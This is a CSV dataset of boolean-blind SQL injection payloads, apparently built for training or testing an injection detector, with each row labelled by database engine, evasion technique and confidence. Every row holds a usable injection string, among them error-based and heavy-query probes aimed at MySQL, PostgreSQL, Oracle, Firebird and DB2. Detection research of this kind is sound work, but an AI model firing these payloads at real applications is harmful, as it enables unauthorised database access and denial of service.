payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
1'|| ( select 'mwpd' where 2887 = 2887,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9062"" or 6872 = 6872 and ""aumq"" like ""aumq",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
1 where 2956 = 2956,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) and 8329 = 5584#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as imdt where 6431 = 6431,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as jidc where 6093 = 6093 and 9198 = 9198--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-3634%' ) ) or 2671 = 2434,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select xruo where 5709 = 5709 and 7533 = 7533 ) +',boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-3059' ) as jhbh where 4056 = 4056 or ( 3498 = 6965 ) *6965--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 1537 = 1537 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1'+ ( select 'epza' where 8994 = 8994 and make_set ( 3782 = 2428,2428 ) ) +'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) and 9198 = 9198--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as dooi where 1806 = 1806 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2373%"" ) or 9323 = 9323#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) and 2006 = 2006,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-5031' or 9323 = 9323#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as eagr where 3366 = 3366 and elt ( 4249 = 4249,7259 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-7139"" ) where 2723 = 2723 or 3900 = 5082--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'+ ( select mcfb where 4050 = 4050 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-3821' ) or 9323 = 9323#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'xyrk' from dual where 9844 = 9844 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
1' ) ) as cwss where 9720 = 9720,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" and 2006 = 2006",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select biqo where 6046 = 6046,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-3998' ) ) or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 where 3175 = 3175 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1"" ) as ypfa where 6128 = 6128",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select plhk where 6540 = 6540,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5640"" ) ) or 9792 = 2728--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-5764 or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"select * from generate_series ( 3551,3551,case when ( 3551 = 6451 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
-4313%' ) or 6872 = 6872 and ( '%' = ',boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as selm where 5759 = 5759,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-8447 where 2850 = 2850 or 7147 = 3262,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 6179 = 6179",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 6842 = 6842,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-3937 ) ) or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as zbfj where 2285 = 2285",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) where 4407 = 4407 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
1 and 4595 = 4595#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) as zmjm where 9125 = 9125 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1' ) ) as nxhp where 2649 = 2649 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-4901 ) or 3407 = 6442#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' where 4134 = 4134 and 1102 = 6300--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-6433%' ) ) or 9323 = 9323#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-8836%' ) or 4856 = 3891,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-3243 or 2266 = 3583#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-9120' ) ) or 8571 = 8571--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select naiw where 4924 = 4924,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-9389' ) or 8859 = 3989--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as tngy where 8956 = 8956 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'+ ( select 'uzaw' where 9900 = 9900 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) as dlfq where 8410 = 8410",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as ihsc where 3978 = 3978,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) where 7391 = 7391 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1'+ ( select dklj where 3265 = 3265,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-3083 ) or 5221 = 7829,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-9340 ) where 5462 = 5462 or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) where 6472 = 6472,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as xirr where 2425 = 2425,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1%' ) ) and 4595 = 4595#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) ) as avdz where 1881 = 1881 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'stdl' where 4581 = 4581,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1%' ) ) and 2006 = 2006,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) ) as dqfl where 7527 = 7527,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"( select * from generate_series ( 3906,3906,case when ( 3906 = 3906 ) then 1 else 0 end ) limit 1 )",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1"" ) as sraw where 1997 = 1997 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) where 9248 = 9248",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 9855 = 9855",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' where 8469 = 8469,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 6785 = 6785 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) as dgzf where 4834 = 4834",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-8557 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1 ) as uuro where 6784 = 6784,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) where 6424 = 6424,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'sxya' where 3578 = 3578,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"select * from generate_series ( 7667,7667,case when ( 7667 = 8232 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as jqli where 7793 = 7793",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) ) and 6991 = 5579,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) as idvt where 3490 = 3490 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
1'+ ( select 'kcix' where 1117 = 1117,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'jaok' where 2592 = 2592,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as jebl where 3464 = 3464",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as bksv where 5375 = 5375",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) and 7533 = 7533,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' where 8729 = 8729,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'+ ( select acax where 4169 = 4169 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",boolean_blind,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-7561 ) as ilrm where 8828 = 8828 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1', ( select * from generate_series ( 5609,5609,case when ( 5609 = 5609 ) then 1 else 0 end ) limit 1 )",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1'+ ( select 'myrb' where 3622 = 3622 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) +'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) where 1600 = 1600 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1', ( select ( case when ( 8640 = 8640 ) then ( ascii ( regexp_substring ( repeat ( right ( char ( 8640 ) ,0 ) ,500000000 ) ,null ) ) ) else 8640/ ( select 0 from information_schema.system_users ) end ) from information_schema.system_users ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
1'+ ( select kzgg where 5070 = 5070,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-9178' ) or 9779 = 6351,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select gblp where 6768 = 6768,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'jjpy' from dual where 6295 = 6295,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
1'|| ( select 'vwmg' where 7928 = 7928,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) where 7471 = 7471 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as xtlt where 9293 = 9293",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 2152 = 2152",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'yhcf' where 8367 = 8367,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) where 8707 = 8707 and 3210 = 1477--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'aevx' from dual where 9999 = 9999,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
1'+ ( select snam where 1993 = 1993,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) as bpmk where 4506 = 4506",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' in boolean mode ) and 4595 = 4595#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-4259' ) ) as usqu where 5419 = 5419 or elt ( 8325 = 8837,8837 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select qsmo where 3172 = 3172,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4606"" ) as elek where 8261 = 8261 or 8571 = 8571--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'kitk' where 6311 = 6311,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'lxpg' where 7390 = 7390 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",boolean_blind,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 where 7906 = 7906 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1'+ ( select jqyo where 4426 = 4426 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4095' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1' where 2690 = 2690,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as qqhm where 7182 = 7182",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) ) ) and 2006 = 2006,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-8032%' ) ) ) or 9323 = 9323#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'kiqf' where 5920 = 5920,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1139 ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-7146"" where 6431 = 6431 or 8548 = 5549--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-1396 where 5838 = 5838 or 9323 = 9323#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 5358 = 5358",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as ylah where 9248 = 9248",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-4803%' ) ) or 8571 = 8571--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'+ ( select 'qaar' where 7841 = 7841 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",boolean_blind,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-8034"" or 8571 = 8571--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 5616 = 5616,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'tbfj' where 4016 = 4016,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1 ) ) and 4595 = 4595#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1%' ) ) and 1651 = 9324 and ( ( '%' = ',boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' where 1085 = 1085 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1%' and 6454 = 8348 and '%' = ',boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'ogyu' from dual where 6691 = 6691,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
"-6629%"" ) ) ) or 8571 = 8571--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-2983' ) or 8571 = 8571--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 9173 = 9173 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9526 where 5734 = 5734 or elt ( 1032 = 1032,3623 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) where 3030 = 3030,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1%"" and 2805 = 1345",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as pwvu where 8267 = 8267",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-7939"" ) or 3958 = 6909",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-3136%' ) or 3400 = 6002,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'tjzy' where 3037 = 3037,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'+ ( select 'vkis' where 3712 = 3712 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) +'",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
1' ) as fyib where 9246 = 9246,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 and 2620 = 2175,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 7228 = 7228",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'qdkb' where 4331 = 4331,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'kyhs' from dual where 9491 = 9491,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
1 ) ) as zykv where 2158 = 2158,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) as zelk where 1944 = 1944 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
1 ) ) as fqee where 3286 = 3286,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 7452 = 7452",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"select * from generate_series ( 9058,9058,case when ( 9058 = 1183 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1' ) where 6274 = 6274 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1'+ ( select 'asdq' where 4023 = 4023 and make_set ( 8403 = 8403,8899 ) ) +'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) ) as fcjk where 7755 = 7755,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) and 4595 = 4595#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-8118"" ) where 3561 = 3561 or ( 8459 = 8459 ) *4906--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-8023' or 6872 = 6872,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 3311 = 3311,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as tljw where 8474 = 8474 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5761"" ) or 3762 = 1274",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 6964 = 6964",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as wquy where 2518 = 2518,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select mhfn where 2425 = 2425,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' where 8231 = 8231,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as qpai where 2619 = 2619,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 where 5925 = 5925 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) as akvn where 8669 = 8669,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as zemm where 3324 = 3324 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-4351' ) or 6525 = 9458,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'baur' from dual where 9384 = 9384 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,oracle,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
1' ) ) ) and 7401 = 9838#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) where 3579 = 3579 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
1' ) as tqdg where 9355 = 9355,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 4991 = 4991 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1 ) where 5073 = 5073 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) as fcrx where 2929 = 2929 and 2820 = 5133",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as cyom where 2318 = 2318 and 7533 = 7533--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 3956 = 3956,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) and 8677 = 9054#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) ) and 4637 = 1408 and ( ( 6509 = 6509,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 2570 = 2570 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1%' ) ) ) and 9198 = 9198--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as dfmm where 7563 = 7563 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 8438 = 7620--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 and 7533 = 7533,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' where 6953 = 6953 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) where 1144 = 1144 and 2006 = 2006",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) where 7748 = 7748 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-1772' or 7911 = 4985#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
